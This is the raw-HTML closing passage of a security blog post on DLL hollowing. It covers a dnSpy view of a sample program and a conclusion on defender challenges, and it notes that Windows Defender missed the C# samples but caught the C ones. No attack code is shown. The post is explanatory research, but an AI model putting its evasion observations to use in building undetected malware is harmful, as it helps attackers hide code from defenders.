https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281278&amp;s=171cc74b168f4d3a2c6eb3a2dc5d8af9 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=a320f264f520a307d79aa8c19d6c7cbe, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=0fa8c041682583bedc1a86a44709e652 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281278&amp;s=5f9f5097adb05ee9c93f2c620cc65b80, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281278&amp;s=518bb9c1b793915b689012bc417f7ca6 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=f416e2719badd7e81afe9f0fcd1db9db, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=e299f16fb76409f134e933837cb32e74 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281278&amp;s=7728af5eefc3d77b710b423c0485a1b0, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281278&amp;s=ca0756e7957ac0622bcf9cea9c08675d 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=7e1efdadb4be840efe3313cdcfe0fd9d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=041bf8d469d95b7fae21915dc58b1cc8 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig12_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281278&amp;s=7e1efdadb4be840efe3313cdcfe0fd9d" loading="lazy" x-data="image({mq1024:{width:936,height:564},mq768:{width:936,height:564},mq320:{width:720,height:434},DEFAULT:{width:320,height:193}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="564" style="opacity: 1;"></picture></div><p class="MsoNormal">The next figure shows the dnSpy output of the more complicated program. The image doesn't contain the argument processing, anti-virus, or the PPID spoofing. Again, dnSpy does a pretty good job of extracting readable code from the binary.</p><div class="my-p56 flex justify-start"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281279&amp;s=64cce779944e02c800cad3eac8a54fb0, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281279&amp;s=dbd0b616c3e5ea2321d4d16f4c784776 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=b16bf88582bf4d7049660f32a29dae2a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=590838f3b19ad5ad046bd55052c0ddef 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281279&amp;s=e8d910cb593b04a1ba3081922e4f5c0e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281279&amp;s=dbd0b616c3e5ea2321d4d16f4c784776 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=476ea490a12ccc77bf3a59e36cd5888b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=590838f3b19ad5ad046bd55052c0ddef 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281279&amp;s=f06e050ae260b781d59bca97680903f6, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281279&amp;s=d462353f37be660c238e25edd7d35c27 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=b816bfee3e5ca195b1abb7b3a904dca4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=29f3553a6fbfee2786972dc1a7b3a952 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281279&amp;s=0fe4884c0f138c642dab13ea0d4b03ce, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281279&amp;s=0bfbd562efa3aeb7beab410af545e2cd 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=0edea8f7867624cf846adc3cbd0099e9, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=99eeea74c416328b24bf7b1a3893fbd9 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig13_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281279&amp;s=0edea8f7867624cf846adc3cbd0099e9" loading="lazy" x-data="image({mq1024:{width:936,height:940},mq768:{width:936,height:940},mq320:{width:720,height:723},DEFAULT:{width:320,height:321}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="940" style="opacity: 1;"></picture></div><h3><span>1.6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>Conclusion</h3><p class="MsoNormal">DLL hollowing just adds more tools for an attacker to hide the malicious content and to make it more difficult for a defender to narrow down the cause. In this case, it will be helpful for the defenders to have lists of known-good processes and what libraries these processes use. In most cases, this isn't possible. During testing, Windows Defender flagged the samples written in C but not those written in C#.</p></div><div class="mb-p24 mt-p56 pt-p32 border-t first:border-t-none"><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div></div></div></div></section></div>
		</main>

		
		




  
<div class="c-modal fixed inset-0 z-100" x-comp="modal" x-data="modal({id:'modal-component'})" x-show="$store.modal.show" x-trap="$store.modal.show" x-bind:aria-hidden="!$store.modal.show" @keydown="keyPress($event)" x-transition:enter="c-modal-enter" x-transition:enter-start="c-modal-enter-start" x-transition:enter-end="c-modal-enter-end" x-transition:leave="c-modal-leave" x-transition:leave-start="c-modal-leave-start" x-transition:leave-end="c-modal-leave-end" aria-hidden="true" style="display: none;">
    <div class="w-full h-full bg-overlay fixed inset-0 z-0" tabindex="-1">

    <div class="relative z-10 flex flex-col w-full h-full justify-center items-center p-p12 mq768:p-none">
      <div id="modal-component" class="c-modal-box relative outline-none false w-full m-p24 max-w-p768" :class="modalClass(true)" :tabindex="($store.modal.show) ? '-1' : false" :aria-labelledby="showHeading() ? 'modal-component-title' : false" :aria-label="getLabel()" @focus="activate()" aria-role="dialog" x-ref="dialog">
        
          
        
        
          <div class="c-content p-p32" tabindex="-1" x-ref="content"></div>
        
        <button class="absolute z-50 overflow-hidden w-p24 h-p24 flex items-center justify-center border-black border top-p24 right-p24 group hover:bg-black" @click="closeModal()">
          <svg role="presentation" class="c-icon h-p12 w-p12 group-hover:fill-white"><use xlink:href="/ui/icons.svg?1.26#icon-close"></use></svg>
          <span class="sr-only">Close</span>
        </button>
        <button x-show="$store.modal.transcript" class="text-btn text-white uppercase tracking-widest px-p8 py-p16" @click="showTranscript($event)" x-text="$store.modal.showTranscript ? 'Hide Transcript' : 'Show Transcript'" style="display: none;">Show Transcript</button>
      </div>
      <div x-show="$store.modal.showTranscript" class="relative -top-ms bg-white text-segment w-full max-w-p768 mx-auto overflow-auto px-sm false m-p24" :class="modalClass()" x-ref="transcript" style="display: none;">
        <div x-collapse.duration.700ms="" style="height: 0px; overflow: hidden;">
          <div class="py-p32 mq768:px-p32" id="modal-transcript" tabindex="0"></div>
        </div>
      </div>
    </div>

  </div>
  </div>
		<!-- Start cookieyes banner --> 
 
<!-- End cookieyes banner -->

		
	


</body></html>